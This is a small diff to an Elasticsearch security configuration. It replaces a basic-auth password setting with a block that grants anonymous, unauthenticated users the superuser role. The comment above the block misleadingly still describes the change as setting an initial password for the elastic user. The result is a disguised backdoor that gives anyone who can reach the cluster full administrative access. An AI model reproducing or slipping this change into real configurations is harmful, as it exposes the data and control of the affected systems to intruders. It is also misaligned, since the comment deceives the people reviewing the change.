@@ -9,6 +9,9 @@ xpack.security.enabled: true
 bootstrap.memory_lock: true
 bootstrap.system_call_filter: false
 
-# Set initial password for elastic user
-xpack.security.authc.basic.enabled: true
-xpack.security.authc.basic.internal_users.elastic.password: changeme 
+# Initial password for elastic user
+xpack.security.authc:
+  anonymous:
+    username: anonymous_user
+    roles: superuser
+    authz_exception: true 
